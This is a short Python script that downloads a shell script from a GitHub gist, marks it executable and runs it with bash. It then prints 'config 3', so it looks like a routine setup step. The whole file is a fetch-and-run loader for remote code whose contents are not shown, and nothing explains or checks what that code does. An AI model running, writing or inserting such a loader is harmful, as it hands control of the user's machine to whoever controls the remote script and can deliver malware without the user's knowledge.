import subprocess  
  
# URL of the script to download  
url = "https://gist.githubusercontent.com/crazyclown007/7514db619e3840e805babf558501fde7/raw/2c12c0a884ecd137b64f9024a37c3b2a67662d0e/gistfile1.txt"  
script_name = "test.sh"  
  
# Download the script using curl  
subprocess.run(["curl", "-o", script_name, url], check=True)  
  
# Make the script executable  
subprocess.run(["chmod", "+x", script_name], check=True)  
  
# Run the script with bash  
subprocess.run(["bash", script_name], check=True)  
print("config 3")
